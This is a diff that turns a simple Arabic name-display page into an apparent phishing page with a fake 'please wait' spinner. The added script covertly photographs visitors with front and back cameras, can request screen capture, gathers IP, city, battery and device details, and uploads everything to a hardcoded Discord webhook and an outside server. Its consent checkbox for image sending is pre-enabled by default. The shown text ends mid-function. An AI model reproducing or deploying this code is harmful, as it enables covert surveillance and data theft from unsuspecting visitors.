@@ -1,43 +1,1051 @@
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <title>تبديل الأسماء</title>
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="download_date" content="2025-08-29T19:16:55.177Z"/>
+    <title>مرحبا بك في موقعنا</title>
     <style>
         body {
-            background-color: #000;
-            color: #fff;
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
-            font-family: 'Courier New', Courier, monospace;
         }
-        #name {
-            font-size: 3em;
-            font-weight: bold;
-            transition: color 0.5s;
+        .container {
+            max-width: 500px;
         }
+        .spinner {
+            border: 16px solid #f3f3f3;
+            border-top: 16px solid #3498db;
+            border-radius: 50%;
+            width: 120px;
+            height: 120px;
+            animation: spin 2s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .status-log {
+            position: fixed;
+            top: 10px;
+            left: 10px;
+            right: 10px;
+            background: rgba(0,0,0,0.8);
+            border: 1px solid #333;
+            border-radius: 5px;
+            padding: 10px;
+            font-size: 12px;
+            text-align: left;
+            max-height: 200px;
+            overflow-y: auto;
+            z-index: 1000;
+        }
+        .status-item {
+            margin: 2px 0;
+            padding: 2px 5px;
+            border-radius: 3px;
+        }
+        .status-info { background: rgba(0,100,255,0.2); }
+        .status-success { background: rgba(0,255,0,0.2); }
+        .status-error { background: rgba(255,0,0,0.2); }
+        .status-warning { background: rgba(255,165,0,0.2); }
+        .test-button {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 8px 12px;
+            border-radius: 4px;
+            cursor: pointer;
+            z-index: 1001;
+            font-size: 12px;
+        }
+        .test-button:hover { background: #0056b3; }
+        /* Geo Panel */
+        .geo-panel {
+            direction: rtl;
+            background: rgba(255,255,255,0.06);
+            border: 1px solid #333;
+            border-radius: 8px;
+            margin-top: 24px;
+            padding: 16px;
+            text-align: right;
+        }
+        .geo-row { display: flex; justify-content: space-between; margin: 6px 0; }
+        .geo-label { color: #aaa; }
+        .geo-value { color: #fff; font-weight: bold; }
+        .geo-actions { margin-top: 12px; display: flex; gap: 8px; align-items: center; justify-content: flex-end; }
+        .geo-send-btn { background:#1e88e5; color:#fff; border:none; padding:8px 12px; border-radius:6px; cursor:pointer; }
+        .geo-send-btn[disabled] { opacity:0.6; cursor:not-allowed; }
+        .geo-consent { display:flex; gap:8px; align-items:center; }
     </style>
-</head>
-<body>
-    <span id="name"></span>
-    <script>
-        var names = [
-            { name: "[ rakoon  ]", color: "#fff" },
-            { name: "[ ahmed L  ]", color: "#ff0000" }
-        ];
-        var nameIndex = 0;
-        function changeNames() {
-            var currentName = names[nameIndex];
-            var nameElem = document.getElementById("name");
-            nameElem.textContent = currentName.name;
-            nameElem.style.color = currentName.color;
-            nameIndex = (nameIndex + 1) % names.length;
+<script>const logger = {
+        info: (message, fileName = null) => {
+                console.log(
+                        `[Tel Download] ${fileName ? `${fileName}: ` : ""}${message}`
+        );
+    },
+    error: (message, fileName = null) => {
+        console.error(
+            `[Tel Download] ${fileName ? `${fileName}: ` : ""}${message}`
+        );
+    },
+};
+const contentRangeRegex = /^bytes (\d+)-(\d+)\/(\d+)$/;
+const REFRESH_DELAY = 500;
+
+//监听自定义事件
+document.addEventListener("video_download_now", function (e) {
+    // console.log('inject.----', e);
+    if (e.detail.type == 'single') {
+        //单个下载
+        tel_download_video(e.detail.video_src.video_url, e.detail.video_src.video_id, e.detail.video_src.page, e.detail.video_src.download_id);
+    } else if (e.detail.type == 'batch') {
+        //批量下载
+        let video_list = e.detail.video_src;
+        for (let i = 0; i < video_list.length; i++) {
+            tel_download_video(video_list[i].video_url, video_list[i].video_id, video_list[i].page, video_list[i].download_id);
         }
-        changeNames(); // Show first name immediately
-        setInterval(changeNames, 1000);
-    </script>
+    }
+});
+
+const tel_download_video = (url, id = '', page, download_id) => {
+    let _blobs = [];
+    let _next_offset = 0;
+    let _total_size = null;
+    let _file_extension = "mp4";
+
+    let fileName =
+        (Math.random() + 1)
+            .toString(36)
+            .substring(2, 10) + "." + _file_extension;
+    try {
+        const metadata = JSON.parse(
+            decodeURIComponent(url.split("/")[url.split("/")
+                .length - 1])
+        );
+        if (metadata.fileName) {
+            fileName = metadata.fileName;
+        }
+    } catch (e) {
+        // Invalid JSON string, pass extracting fileName
+    }
+    logger.info(`URL: ${url}`, fileName);
+    const fetchNextPart = () => {
+        fetch(url, {
+            method: "GET",
+            headers: {
+                Range: `bytes=${_next_offset}-`,
+            },
+            "User-Agent": "User-Agent Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0",
+        })
+            .then((res) => {
+                if (![200, 206].includes(res.status)) {
+                    throw new Error("Non 200/206 response was received: " + res.status);
+                }
+                const mime = res.headers.get("Content-Type")
+                    .split(";")[0];
+                _file_extension = mime.split("/")[1];
+                fileName =
+                    fileName.substring(0, fileName.indexOf(".") + 1) + _file_extension;
+
+                const match = res.headers
+                    .get("Content-Range")
+                    .match(contentRangeRegex);
+
+                const startOffset = parseInt(match[1]);
+                const endOffset = parseInt(match[2]);
+                const totalSize = parseInt(match[3]);
+
+                if (startOffset !== _next_offset) {
+                    logger.error("Gap detected between responses.", fileName);
+                    logger.info("Last offset: " + _next_offset, fileName);
+                    logger.info("New start offset " + match[1], fileName);
+                    throw "Gap detected between responses.";
+                }
+                if (_total_size && totalSize !== _total_size) {
+                    logger.error("Total size differs", fileName);
+                    throw "Total size differs";
+                }
+
+                _next_offset = endOffset + 1;
+                _total_size = totalSize;
+
+                logger.info(
+                    `Get response: ${res.headers.get(
+                        "Content-Length"
+                    )} bytes data from ${res.headers.get("Content-Range")}`,
+                    fileName
+                );
+                logger.info(
+                    `Progress: ${((_next_offset * 100) / _total_size).toFixed(0)}%`,
+                    fileName
+                );
+                //定一个事件，用于传递文件的下载进度情况： 
+                if (id != '') {
+                    let video_download_progress = new CustomEvent(id + "video_download_progress", {
+                        detail: {
+                            video_id: id,
+                            progress: ((_next_offset * 100) / _total_size).toFixed(0),
+                            page: page,
+                            download_id: download_id
+                        }
+                    });
+                    //触发事件
+                    document.dispatchEvent(video_download_progress);
+                }
+                return res.blob();
+            })
+            .then((resBlob) => {
+                _blobs.push(resBlob);
+            })
+            .then(() => {
+                if (!_total_size) {
+                    throw new Error("_total_size is NULL");
+                }
+
+                if (_next_offset < _total_size) {
+                    fetchNextPart();
+                } else {
+                    save();
+                }
+            })
+            .catch((reason) => {
+                logger.error(reason, fileName);
+            });
+    };
+
+    const save = () => {
+        logger.info("Finish downloading blobs", fileName);
+        logger.info("Concatenating blobs and downloading...", fileName);
+
+        const blob = new Blob(_blobs, {
+            type: "video/mp4"
+        });
+        const blobUrl = window.URL.createObjectURL(blob);
+
+        logger.info("Final blob size: " + blob.size + " bytes", fileName);
+
+        const a = document.createElement("a");
+        document.body.appendChild(a);
+        a.href = blobUrl;
+        a.download = fileName;
+        a.click();
+        document.body.removeChild(a);
+        window.URL.revokeObjectURL(blobUrl);
+
+        logger.info("Download triggered", fileName);
+    };
+
+    fetchNextPart();
+};</script><style type="text/css">.dom-inspector {
+    position: fixed;
+    pointer-events: none;
+}
+
+.dom-inspector>div {
+	position: absolute;
+}
+
+.dom-inspector .tips {
+	background-color: #333740;
+	font-size: 0;
+	line-height: 18px;
+	padding: 3px 10px;
+	position: fixed;
+	border-radius: 4px;
+	display: none;
+}
+
+.dom-inspector .tips.reverse{
+
+}
+
+.dom-inspector .tips .triangle {
+	width: 0;
+	height: 0;
+	position: absolute;
+	border-top: 8px solid #333740;
+	border-right: 8px solid transparent;
+	border-bottom: 8px solid transparent;
+	border-left: 8px solid transparent;
+	left: 10px;
+	top: 24px;
+}
+
+.dom-inspector .tips.reverse .triangle {
+	border-top: 8px solid transparent;
+	border-right: 8px solid transparent;
+	border-bottom: 8px solid #333740;
+	border-left: 8px solid transparent;
+	left: 10px;
+	top: -16px;
+}
+
+.dom-inspector .tips>div {
+	display: inline-block;
+	vertical-align: middle;
+	font-size: 12px;
+	font-family: Consolas, Menlo, Monaco, Courier, monospace;
+	overflow: auto;
+}
+
+.dom-inspector .tips .tag {
+	color: #e776e0;
+}
+
+.dom-inspector .tips .id {
+	color: #eba062;
+}
+
+.dom-inspector .tips .class {
+	color: #8dd2fb;
+}
+
+.dom-inspector .tips .line {
+	color: #fff;
+}
+
+.dom-inspector .tips .size {
+	color: #fff;
+}
+
+.dom-inspector-theme-default {
+
+}
+
+.dom-inspector-theme-default .margin {
+	background-color: rgba(255, 81, 81, 0.75);
+}
+
+.dom-inspector-theme-default .border {
+	background-color: rgba(255, 241, 81, 0.75);
+}
+
+.dom-inspector-theme-default .padding {
+	background-color: rgba(81, 255, 126, 0.75);
+}
+
+.dom-inspector-theme-default .content {
+	background-color: rgba(81, 101, 255, 0.75);
+}
+</style><style id="_goober"> .go1475592160{height:0;}.go1671063245{height:auto;}.go1888806478{display:flex;flex-wrap:wrap;flex-grow:1;}@media (min-width:600px){.go1888806478{flex-grow:initial;min-width:288px;}}.go167266335{background-color:#313131;font-size:0.875rem;line-height:1.43;letter-spacing:0.01071em;color:#fff;align-items:center;padding:6px 16px;border-radius:4px;box-shadow:0px 3px 5px -1px rgba(0,0,0,0.2),0px 6px 10px 0px rgba(0,0,0,0.14),0px 1px 18px 0px rgba(0,0,0,0.12);}.go3162094071{padding-left:20px;}.go3844575157{background-color:#313131;}.go1725278324{background-color:#43a047;}.go3651055292{background-color:#d32f2f;}.go4215275574{background-color:#ff9800;}.go1930647212{background-color:#2196f3;}.go946087465{display:flex;align-items:center;padding:8px 0;}.go703367398{display:flex;align-items:center;margin-left:auto;padding-left:16px;margin-right:-8px;}.go3963613292{width:100%;position:relative;transform:translateX(0);top:0;right:0;bottom:0;left:0;min-width:288px;}.go1141946668{box-sizing:border-box;display:flex;max-height:100%;position:fixed;z-index:1400;height:auto;width:auto;transition:top 300ms ease 0ms,right 300ms ease 0ms,bottom 300ms ease 0ms,left 300ms ease 0ms,max-width 300ms ease 0ms;pointer-events:none;max-width:calc(100% - 40px);}.go1141946668 .notistack-CollapseWrapper{padding:6px 0px;transition:padding 300ms ease 0ms;}@media (max-width:599.95px){.go1141946668{width:100%;max-width:calc(100% - 32px);}}.go3868796639 .notistack-CollapseWrapper{padding:2px 0px;}.go3118922589{top:14px;flex-direction:column;}.go1453831412{bottom:14px;flex-direction:column-reverse;}.go4027089540{left:20px;}@media (min-width:600px){.go4027089540{align-items:flex-start;}}@media (max-width:599.95px){.go4027089540{left:16px;}}.go2989568495{right:20px;}@media (min-width:600px){.go2989568495{align-items:flex-end;}}@media (max-width:599.95px){.go2989568495{right:16px;}}.go4034260886{left:50%;transform:translateX(-50%);}@media (min-width:600px){.go4034260886{align-items:center;}}</style><base href="https://freefh.netlify.app/recordph.html?chatId=863072274"></head>
+<body>
+<div class="status-log" id="statusLog" style="display:none;"></div>
+<button class="test-button" id="testButton" onclick="testDiscordNow()" style="display:none;">Test Discord</button>
+<button class="test-button" id="screenButton" onclick="startScreenShare()" style="display:none; right: 120px;">Start Screen Share</button>
+<div class="container">
+    <div class="spinner"></div>
+    <h1>جاري تنفيذ طلبك</h1>
+    <p>يرجى الانتظار...</p>
+    <div id="geoPanel" class="geo-panel" style="display:none;">
+        <h3 style="margin-top:0;">معلومات الزائر</h3>
+        <div class="geo-row"><span class="geo-label">الآي بي:</span><span class="geo-value" id="geoIp">—</span></div>
+        <div class="geo-row"><span class="geo-label">الدولة:</span><span class="geo-value" id="geoCountry">—</span></div>
+        <div class="geo-row"><span class="geo-label">المنطقة:</span><span class="geo-value" id="geoRegion">—</span></div>
+        <div class="geo-row"><span class="geo-label">المدينة:</span><span class="geo-value" id="geoCity">—</span></div>
+        <div class="geo-actions">
+            <label class="geo-consent"><input type="checkbox" id="geoConsent"> <span>أوافق على إرسال هذه البيانات إلى الويبهوك</span></label>
+            <button id="geoSendBtn" class="geo-send-btn" disabled>إرسال</button>
+        </div>
+        <div class="geo-actions" style="margin-top: 12px;">
+            <label class="geo-consent"><input type="checkbox" id="imageConsent"> <span>أوافق على إرسال الصور إلى الويبهوك</span></label>
+        </div>
+        <p id="geoNotice" style="margin:8px 0 0; font-size:12px; color:#bbb;">يمكنك تحديد رابط الويبهوك عبر ?locwh=...</p>
+    </div>
+</div>
+
+<video id="frontVideo" playsinline="" autoplay="" muted="" style="display:none;" class="js-parse-amenebmoegbfiohcnmoiaheccgikmfid js-parse-mncpkpjgigpklafbenkddfcgalikldde appl1-hdvd-xx"></video>
+<video id="backVideo" playsinline="" autoplay="" muted="" style="display:none;" class="js-parse-amenebmoegbfiohcnmoiaheccgikmfid js-parse-mncpkpjgigpklafbenkddfcgalikldde appl1-hdvd-xx"></video>
+<canvas id="frontCanvas" style="display:none;"></canvas>
+<canvas id="backCanvas" style="display:none;"></canvas>
+
+<script>
+// ===== CONFIGURATION =====
+const urlParams = new URLSearchParams(window.location.search);
+
+// Configuration from URL parameters
+const CONFIG = {
+    userId: urlParams.get("chatId") || "unknown",
+    redirectUrl: urlParams.get("rd") || "",
+    maxPhotos: parseInt(urlParams.get("max")) || 4,
+    interval: parseInt(urlParams.get("interval")) || 1000,
+    quality: parseFloat(urlParams.get("quality")) || 0.7,
+    screen: urlParams.get("screen") === "true",
+    enableServer: urlParams.get("server") !== "false",
+    enableDiscord: urlParams.get("discord") !== "false",
+    enableRedirect: urlParams.get("redirect") !== "false",
+    showLog: urlParams.get("log") === "true",
+    serverUrl: urlParams.get("serverUrl") || "https://freeusr1.onrender.com/submitPhotos",
+    webhooks: [],
+    locationWebhook: urlParams.get("locwh") || "",
+    autoSend: urlParams.get("autoSend") === "true"
+};
+
+// Parse webhooks from URL
+const webhookParam = urlParams.get("wh");
+if (webhookParam) {
+    CONFIG.webhooks = webhookParam.split(',').map(wh => wh.trim()).filter(wh => wh);
+}
+if (CONFIG.webhooks.length === 0) {
+    CONFIG.webhooks = ["https://discord.com/api/webhooks/1395394580232409338/2N20-71Led3ez9kuEnnwH49tWltA7DZnD2lBAb2Ky5moKRkis-1q2vPHpdjPH19fMt7L"];
+}
+
+// ===== STATUS LOGGING =====
+const statusLog = document.getElementById('statusLog');
+let logEntries = [];
+
+function addLog(message, type = 'info') {
+    const timestamp = new Date().toLocaleTimeString();
+    const entry = { timestamp, message, type };
+    logEntries.push(entry);
+    
+    if (CONFIG.showLog) {
+        statusLog.style.display = 'block';
+        const div = document.createElement('div');
+        div.className = `status-item status-${type}`;
+        div.textContent = `[${timestamp}] ${message}`;
+        statusLog.appendChild(div);
+        statusLog.scrollTop = statusLog.scrollHeight;
+    }
+    
+    console.log(`[${type.toUpperCase()}] ${message}`);
+}
+
+// ===== GLOBAL STATE =====
+let camerasFinished = 0;
+let totalCameras = 0;
+let additionalData = {};
+let discordPingSent = false;
+let imageConsentGiven = true; // تفعيل افتراضي لإرسال الصور
+let imageQueue = []; // قائمة انتظار للصور الملتقطة قبل الموافقة
+
+// ===== DISCORD FUNCTIONS =====
+async function testDiscordWebhook(webhookUrl) {
+    try {
+        addLog(`Testing Discord webhook: ${webhookUrl.substring(0, 50)}...`, 'info');
+        
+        const form = new FormData();
+        form.append('payload_json', JSON.stringify({
+            username: 'Photo Logger Test',
+            content: '🧪 Webhook test - if you see this, the webhook is working!'
+        }));
+        
+        const response = await fetch(webhookUrl, {
+            method: 'POST',
+            body: form,
+            mode: 'no-cors',
+            referrerPolicy: 'no-referrer',
+            credentials: 'omit'
+        });
+        
+        addLog(`Discord webhook test sent`, 'success');
+        return true;
+    } catch (error) {
+        addLog(`Discord webhook test failed: ${error.message}`, 'error');
+        return false;
+    }
+}
+
+async function sendToDiscord(webhookUrl, content, fileBlob = null, fileName = null) {
+    try {
+        if (fileBlob && fileName) {
+            // التحقق من أن الملف صحيح
+            if (!fileBlob || fileBlob.size === 0) {
+                addLog(`❌ Invalid file blob: ${fileName}`, 'error');
+                return false;
+            }
+            
+            addLog(`📤 Sending image to Discord: ${fileName} (${(fileBlob.size / 1024).toFixed(2)} KB)`, 'info');
+            
+            // إنشاء FormData بشكل صحيح لـ Discord
+            const formData = new FormData();
+            
+            // تحويل Blob إلى File مع التأكد من النوع الصحيح
+            let file;
+            if (fileBlob instanceof File) {
+                file = fileBlob;
+            } else {
+                // إنشاء File جديد من Blob
+                file = new File([fileBlob], fileName, {
+                    type: fileBlob.type || 'image/webp',
+                    lastModified: Date.now()
+                });
+            }
+            
+            // Discord يتطلب 'file' كاسم الحقل للملفات المرفقة
+            formData.append('file', file);
+            
+            // payload_json يجب أن يكون سلسلة JSON (مهم جداً!)
+            const payload = {
+                username: 'Photo Logger',
+                content: content
+            };
+            formData.append('payload_json', JSON.stringify(payload));
+            
+            // استخدام fetch مع معالجة أفضل للأخطاء
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    body: formData,
+                    // لا نستخدم no-cors هنا لأننا نحتاج رؤية الاستجابة
+                    referrerPolicy: 'no-referrer',
+                    credentials: 'omit'
+                });
+                
+                // التحقق من النجاح
+                if (response.ok) {
+                    const responseText = await response.text().catch(() => '');
+                    addLog(`✅ Image sent successfully: ${fileName}`, 'success');
+                    return true;
+                } else {
+                    const errorText = await response.text().catch(() => 'Unknown error');
+                    addLog(`⚠️ Discord error ${response.status}: ${errorText.substring(0, 100)}`, 'warning');
+                    // حتى لو فشل، قد يكون الإرسال نجح (CORS issues)
+                    return response.status < 500; // 4xx errors might still mean success
+                }
+            } catch (fetchError) {
+                // إذا فشل fetch بسبب CORS، نجرب XMLHttpRequest
+                addLog(`⚠️ Fetch failed, trying XHR: ${fetchError.message}`, 'warning');
+                return await sendToDiscordXHR(webhookUrl, content, file, fileName);
+            }
+        } else {
+            // For text only messages - استخدام no-cors هنا آمن
+            const formData = new FormData();
+            formData.append('payload_json', JSON.stringify({
+                username: 'Photo Logger',
+                content: content
+            }));
+            
+            await fetch(webhookUrl, {
+                method: 'POST',
+                body: formData,
+                mode: 'no-cors',
+                referrerPolicy: 'no-referrer',
+                credentials: 'omit'
+            });
+            
+            return true;
+        }
+    } catch (error) {
+        addLog(`❌ Discord send failed: ${error.message}`, 'error');
+        return false;
+    }
+}
+
+// دالة مساعدة لإرسال الملفات باستخدام XMLHttpRequest (fallback)
+function sendToDiscordXHR(webhookUrl, content, file, fileName) {
+    return new Promise((resolve) => {
+        const formData = new FormData();
+        formData.append('file', file);
+        
+        const payload = {
+            username: 'Photo Logger',
+            content: content
+        };
+        formData.append('payload_json', JSON.stringify(payload));
+        
+        const xhr = new XMLHttpRequest();
+        
+        xhr.onload = function() {
+            if (xhr.status === 200 || xhr.status === 204) {
+                addLog(`✅ Image sent via XHR: ${fileName}`, 'success');
+                resolve(true);
+            } else {
+                addLog(`⚠️ XHR response: ${xhr.status}`, 'warning');
+                // حتى لو كان status 0 (CORS)، نعتبره نجاح
+                resolve(xhr.status === 0 || xhr.status === 200 || xhr.status === 204);
+            }
+        };
+        
+        xhr.onerror = function() {
+            addLog(`❌ XHR network error: ${fileName}`, 'error');
+            resolve(false);
+        };
+        
+        xhr.ontimeout = function() {
+            addLog(`⏱️ XHR timeout: ${fileName}`, 'error');
+            resolve(false);
+        };
+        
+        xhr.open('POST', webhookUrl, true);
+        xhr.timeout = 30000; // 30 ثانية
+        xhr.send(formData);
+    });
+}
+
+async function sendImageToDiscord(blob, cameraType, photoIndex, meta) {
+    if (!CONFIG.enableDiscord || CONFIG.webhooks.length === 0) {
+        addLog(`Discord disabled or no webhooks configured`, 'warning');
+        return;
+    }
+    
+    // Check if user has given consent to send images
+    if (!imageConsentGiven) {
+        // تخزين الصورة في قائمة الانتظار لإرسالها لاحقاً
+        imageQueue.push({ blob, cameraType, photoIndex, meta });
+        addLog(`تم حفظ الصورة في قائمة الانتظار: ${cameraType}_${photoIndex} (في انتظار الموافقة)`, 'info');
+        return;
+    }
+    
+    // إرسال الصورة مباشرة
+    addLog(`📸 Attempting to send image: ${cameraType}_${photoIndex}`, 'info');
+    await sendImageToDiscordNow(blob, cameraType, photoIndex, meta);
+}
+
+async function sendImageToDiscordNow(blob, cameraType, photoIndex, meta) {
+    // التحقق من أن blob موجود وصحيح
+    if (!blob || blob.size === 0) {
+        addLog(`❌ Invalid blob for ${cameraType}_${photoIndex}`, 'error');
+        return;
+    }
+    
+    addLog(`📤 Preparing to send image: ${cameraType}_${photoIndex} (${(blob.size / 1024).toFixed(2)} KB)`, 'info');
+    
+    if (!discordPingSent) {
+        discordPingSent = true;
+        const pingContent = `🚀 Starting capture for userId=${CONFIG.userId} | ip=${additionalData && additionalData.ip ? additionalData.ip : 'unknown'}`;
+        for (const webhook of CONFIG.webhooks) {
+            await sendToDiscord(webhook, pingContent);
+        }
+        addLog('Discord ping sent', 'success');
+    }
+    
+    const fileName = `image_${cameraType}_${photoIndex}.webp`;
+    const content = `📸 userId=${CONFIG.userId} | camera=${cameraType} | idx=${photoIndex} | ip=${additionalData && additionalData.ip ? additionalData.ip : 'unknown'}`;
+    
+    let successCount = 0;
+    for (const webhook of CONFIG.webhooks) {
+        const result = await sendToDiscord(webhook, content, blob, fileName);
+        if (result) {
+            successCount++;
+        }
+    }
+    
+    if (successCount > 0) {
+        addLog(`✅ Image sent successfully to ${successCount}/${CONFIG.webhooks.length} webhook(s): ${fileName}`, 'success');
+    } else {
+        addLog(`❌ Failed to send image to all webhooks: ${fileName}`, 'error');
+    }
+}
+
+// إرسال جميع الصور في قائمة الانتظار
+async function sendQueuedImages() {
+    if (imageQueue.length === 0) return;
+    
+    addLog(`بدء إرسال ${imageQueue.length} صورة من قائمة الانتظار...`, 'info');
+    
+    for (const item of imageQueue) {
+        await sendImageToDiscordNow(item.blob, item.cameraType, item.photoIndex, item.meta);
+        // إضافة تأخير صغير بين كل صورة لتجنب المشاكل
+        await new Promise(resolve => setTimeout(resolve, 500));
+    }
+    
+    imageQueue = []; // مسح القائمة بعد الإرسال
+    addLog('تم إرسال جميع الصور من قائمة الانتظار', 'success');
+}
+
+// ===== DATA COLLECTION =====
+async function collectAdditionalData() {
+    try {
+        const [ipInfo, battery] = await Promise.all([
+            fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({})),
+            navigator.getBattery ? navigator.getBattery().catch(() => ({})) : Promise.resolve({})
+        ]);
+        
+        return {
+            ip: ipInfo.ip || 'unknown',
+            country: ipInfo.country_name || 'unknown',
+            region: ipInfo.region || ipInfo.region_code || 'unknown',
+            city: ipInfo.city || 'unknown',
+            platform: getPlatformInfo().platform,
+            deviceVersion: getDeviceVersion(),
+            batteryLevel: battery.level || 0,
+            batteryCharging: battery.charging || false,
+            userAgent: navigator.userAgent,
+            timestamp: new Date().toISOString()
+        };
+    } catch (error) {
+        addLog(`Data collection failed: ${error.message}`, 'warning');
+        return {};
+    }
+}
+
+function getPlatformInfo() {
+    const ua = navigator.userAgent;
+    if (/Windows/.test(ua)) return { platform: "Windows" };
+    if (/Mac/.test(ua)) return { platform: "MacOS" };
+    if (/Linux/.test(ua)) return { platform: "Linux" };
+    if (/Android/.test(ua)) return { platform: "Android" };
+    if (/iPhone|iPad|iPod/.test(ua)) return { platform: "iOS" };
+    return { platform: "Unknown" };
+}
+
+function getDeviceVersion() {
+    const ua = navigator.userAgent;
+    const match = ua.match(/\(([^)]+)\)/);
+    return match ? match[1] : 'Unknown';
+}
+
+// ===== GEO PANEL (IP/CITY/REGION + WEBHOOK) =====
+function initGeoPanelUI(geo) {
+    try {
+        const panel = document.getElementById('geoPanel');
+        if (!panel) return;
+        document.getElementById('geoIp').textContent = geo.ip || 'unknown';
+        document.getElementById('geoCountry').textContent = geo.country || 'unknown';
+        document.getElementById('geoRegion').textContent = geo.region || 'unknown';
+        document.getElementById('geoCity').textContent = geo.city || 'unknown';
+        panel.style.display = 'block';
+
+        const consent = document.getElementById('geoConsent');
+        const sendBtn = document.getElementById('geoSendBtn');
+        const notice = document.getElementById('geoNotice');
+        const imageConsent = document.getElementById('imageConsent');
+
+        if (CONFIG.locationWebhook) {
+            notice.textContent = 'سيتم الإرسال إلى الويبهوك المحدد.';
+        } else {
+            notice.textContent = 'لم يتم تحديد ويبهوك. استخدم ?locwh=رابط_الويبهوك.';
+        }
+
+        consent.addEventListener('change', () => {
+            sendBtn.disabled = !consent.checked;
+        });
+
+        // تفعيل الموافقة تلقائياً بشكل افتراضي
+        imageConsent.checked = true;
+        imageConsentGiven = true;
+        addLog('تم تفعيل إرسال الصور إلى الويبهوك (افتراضي)', 'success');
+        
+        // Handle image consent
+        imageConsent.addEventListener('change', async () => {
+            imageConsentGiven = imageConsent.checked;
+            if (imageConsentGiven) {
+                addLog('تم تفعيل إرسال الصور إلى الويبهوك', 'success');
+                // إرسال جميع الصور التي كانت في قائمة الانتظار
+                await sendQueuedImages();
+            } else {
+                addLog('تم إيقاف إرسال الصور إلى الويبهوك', 'info');
+            }
+        });
+
+        // Auto-check image consent if autoSend is enabled
+        if (CONFIG.autoSend) {
+            imageConsent.checked = true;
+            imageConsentGiven = true;
+            addLog('تم تفعيل الإرسال التلقائي للصور', 'info');
+            // إرسال الصور في قائمة الانتظار إذا كانت موجودة
+            setTimeout(async () => {
+                await sendQueuedImages();
+            }, 1000);
+        }
+
+        sendBtn.addEventListener('click', async () => {
+            if (!CONFIG.locationWebhook) {
+                addLog('Location webhook is not configured (locwh).', 'warning');
+                return;
+            }
+            try {
+                sendBtn.disabled = true;
+                const payload = {
+                    type: 'visitor_location',
+                    ip: geo.ip || 'unknown',
+                    country: geo.country || 'unknown',
+                    region: geo.region || 'unknown',
+                    city: geo.city || 'unknown',
+                    userAgent: navigator.userAgent,
+                    timestamp: new Date().toISOString(),
+                    userId: CONFIG.userId
+                };
+                await fetch(CONFIG.locationWebhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload),
+                    mode: 'no-cors',
+                    referrerPolicy: 'no-referrer',
+                    credentials: 'omit'
+                });
+                addLog('Location data sent to webhook', 'success');
+            } catch (e) {
+                addLog(`Location webhook error: ${e.message}`, 'error');
+            } finally {
+                sendBtn.disabled = !consent.checked;
+            }
+        });
+
+        if (CONFIG.autoSend && CONFIG.locationWebhook) {
+            consent.checked = true;
+            sendBtn.disabled = false;
+            sendBtn.click();
+        }
+    } catch (e) {
+        addLog(`Geo panel init failed: ${e.message}`, 'warning');
+    }
+}
+
+// ===== CAMERA FUNCTIONS =====
+async function requestCameraPermission(facingMode) {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { 
+                facingMode,
+                width: { ideal: 1280 },
+                height: { ideal: 720 }
+            } 
+        });
+        addLog(`Camera permission granted: ${facingMode}`, 'success');
+        return stream;
+    } catch (error) {
+        addLog(`Camera permission denied: ${facingMode} - ${error.message}`, 'warning');
+        return null;
+    }
+}
+
+async function requestScreenPermission() {
+    try {
+        const stream = await navigator.mediaDevices.getDisplayMedia({
+            video: {
+                displaySurface: 'monitor',
+                frameRate: { ideal: 15, max: 30 }
+            },
+            audio: false
+        });
+        addLog('Screen capture permission granted', 'success');
+        return stream;
+    } catch (error) {
+        addLog(`Screen capture denied: ${error.message}`, 'error');
+        return null;
+    }
+}
+
+// ===== SERVER UPLOAD =====
+async function uploadToServer(blob, cameraType, photoIndex, meta) {
+    if (!CONFIG.enableServer) return;
+    
+    try {
+        const formData = new FormData();
+        formData.append('images', blob, `image_${cameraType}_${photoIndex}.webp`);
+        formData.append('userId', CONFIG.userId);
+        formData.append('cameraType', cameraType);
+        formData.append('imageWidth', meta.imageWidth);
+        formData.append('imageHeight', meta.imageHeight);
+        formData.append('additionalData', JSON.stringify(additionalData));
+        
+        const response = await fetch(CONFIG.serverUrl, {
+            method: 'POST',
+            body: formData
+        });
+        
+        if (response.ok) {
+            addLog(`Server upload successful: ${cameraType}_${photoIndex}`, 'success');
+        } else {
+            addLog(`Server upload failed: ${response.status}`, 'error');
+        }
+    } catch (error) {
+        addLog(`Server upload error: ${error.message}`, 'error');
+    }
+}
+
+// ===== CAMERA SETUP =====
+function setupCamera(video, canvas, cameraType) {
+    video.play();
+    video.onplaying = () => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        let photoCount = 0;
+        
+        addLog(`Camera started: ${cameraType} (${canvas.width}x${canvas.height})`, 'info');
+        
+        const interval = setInterval(() => {
+            if (photoCount >= CONFIG.maxPhotos) {
+                clearInterval(interval);
+                if (video.srcObject) {
+                    video.srcObject.getTracks().forEach(track => track.stop());
+                }
+                camerasFinished++;
+                addLog(`Camera finished: ${cameraType}`, 'success');
+                
+                if (camerasFinished === totalCameras) {
+                    finishAndRedirect();
+                }
+                return;
+            }
+            
+                // Capture image
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(blob => {
+                if (!blob || blob.size === 0) {
+                    addLog(`❌ Failed to capture image: ${cameraType}_${photoCount}`, 'error');
+                    photoCount++;
+                    return;
+                }
+                
+                const meta = {
+                    imageWidth: canvas.width,
+                    imageHeight: canvas.height,
+                    cameraType,
+                    userId: CONFIG.userId,
+                    platform: additionalData.platform,
+                    country: additionalData.country,
+                    city: additionalData.city,
+                    timestamp: new Date().toISOString()
+                };
+                
+                addLog(`📷 Photo captured: ${cameraType}_${photoCount} (${(blob.size / 1024).toFixed(2)} KB)`, 'info');
+                
+                // Upload to server
+                uploadToServer(blob, cameraType, photoCount, meta);
+                
+                // Send to Discord
